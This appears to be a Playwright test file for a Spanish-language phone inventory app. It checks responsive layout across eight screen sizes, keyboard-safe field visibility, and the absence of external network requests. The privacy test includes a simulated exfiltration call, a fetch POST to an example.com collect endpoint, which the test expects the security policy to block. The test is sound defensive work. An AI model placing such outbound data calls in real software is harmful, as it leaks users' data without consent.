import { expect, test } from '@playwright/test';
import { createInventory, noHorizontalOverflow, purchase, sell, SHOTS } from './helpers';

const VIEWPORTS: [string, number, number][] = [
  ['iphone-se-1', 320, 568],
  ['iphone-se', 375, 667],
  ['iphone-15', 393, 852],
  ['iphone-pro-max', 430, 932],
  ['android-small', 360, 740],
  ['android-pixel', 412, 915],
  ['tablet', 820, 1180],
  ['escritorio', 1280, 800],
];

test('21. diseño adaptable: sin desbordes horizontales en 8 tamaños de pantalla', async ({ page }) => {
  test.setTimeout(420_000);
  await page.goto('/');
  const inv = await createInventory(page, 'Inventario con un nombre bastante largo para probar', 'Profesional');
  await purchase(page, inv, { phone: { model: 'iPhone 17 Pro Max', capacity: '2 TB' } }, 2, 9_999_999, { imeis: ['359876543210987'] });
  const purchaseUrl = page.url();
  await purchase(page, inv, { accessory: 'Cargador inalámbrico MagSafe original con cable de 2 metros' }, 50, 123_456);
  const saleId = await sell(page, inv, 'iPhone 17 Pro Max', 1, 12_345_678, { partial: 1_000_000 });
  await page.goto(`/#/inventarios/${inv}`);
  await page.getByText('iPhone 17 Pro Max 2 TB').click();
  const productUrl = page.url().split('#')[1];
  const unitHref = await page.locator('a[href^="#/unidades/"]').first().getAttribute('href');
  await page.goto(`/#/inventarios/${inv}`);
  await page.getByText(/Cargador inalámbrico MagSafe/).first().click();
  const accessoryUrl = page.url().split('#')[1];

  const screens: [string, string][] = [
    ['inicio', '/'],
    ['inventario', `/inventarios/${inv}`],
    ['producto', productUrl],
    ['unidad', unitHref!.slice(1)],
    ['venta-nueva', `/ventas/nueva?inv=${inv}`],
    ['venta', `/ventas/${saleId}`],
    ['compra', purchaseUrl.split('#')[1]],
    ['informes', '/informes'],
    ['operaciones', '/operaciones'],
    ['respaldo', '/respaldo'],
    ['ajustes', '/ajustes'],
    ['capital', '/capital'],
    ['deudas', '/deudas'],
    ['precios', '/precios'],
    ['calculadora', '/calculadora'],
    ['resumen', '/resumen'],
    ['ayuda', '/ayuda'],
    ['manual', '/ayuda/manual'],
    ['accesorio-lotes', accessoryUrl],
    ['gasto-personal', '/gastos/nuevo?tipo=personal'],
    ['gasto-viaje', '/gastos/nuevo?tipo=compra'],
    ['personal', '/personal'],
    ['aprende', '/aprende'],
    ['leccion', '/aprende/lotes'],
    ['apariencia', '/apariencia'],
    ['analisis', '/analisis?tab=resumen'],
    ['analisis-tendencias', '/analisis?tab=tendencias'],
    ['analisis-flujo', '/analisis?tab=flujo'],
    ['analisis-tiempo', '/analisis?tab=tiempo'],
    ['preguntones', '/preguntones'],
    ['calendario', '/calendario'],
    ['me-deben', '/me-deben'],
    ['notas', '/notas'],
    ['mas', '/mas'],
  ];
  for (const [vname, w, h] of VIEWPORTS) {
    await page.setViewportSize({ width: w, height: h });
    for (const [sname, path] of screens) {
      await page.goto(`/#${path}`);
      await page.waitForTimeout(250);
      await noHorizontalOverflow(page);
      if (['iphone-se-1', 'android-pixel', 'escritorio'].includes(vname) && ['inicio', 'unidad', 'venta-nueva', 'informes', 'capital', 'analisis', 'calendario'].includes(sname))
        await page.screenshot({ path: `${SHOTS}/responsive-${vname}-${sname}.png` });
    }
  }
});

test('teclado abierto: el campo activo queda visible', async ({ page }) => {
  await page.goto('/');
  const inv = await createInventory(page, 'Teclado');
  await purchase(page, inv, { accessory: 'Funda' }, 3, 10_000);
  await page.goto(`/#/ventas/nueva?inv=${inv}`);
  // Simula el teclado ocupando ~55% de la pantalla
  await page.setViewportSize({ width: 390, height: 380 });
  const field = page.locator('#sa-disc');
  await field.focus();
  await page.waitForTimeout(900);
  const box = await field.boundingBox();
  expect(box).not.toBeNull();
  expect(box!.y).toBeGreaterThanOrEqual(0);
  expect(box!.y + box!.height).toBeLessThanOrEqual(380);
});

test('23. la app no envía datos a ningún servidor externo', async ({ page }) => {
  const requests: string[] = [];
  page.on('request', (r) => requests.push(r.url()));
  await page.goto('/');
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("connect-src 'self'");
  const inv = await createInventory(page, 'Red');
  await purchase(page, inv, { phone: { model: 'iPhone 16', capacity: '128 GB' } }, 1, 2_500_000);
  await sell(page, inv, 'iPhone 16 128 GB', 1, 3_000_000);
  await page.goto('/#/respaldo');
  await page.getByTestId('prepare-backup').click();
  await page.goto('/#/informes');
  await page.waitForTimeout(500);
  const external = requests.filter((u) => !u.startsWith('http://localhost:4173/') && !u.startsWith('data:') && !u.startsWith('blob:'));
  expect(external).toEqual([]);
  // Un intento de enviar datos fuera queda bloqueado por la política de seguridad
  const blocked = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/collect', { method: 'POST', body: 'x' });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
});
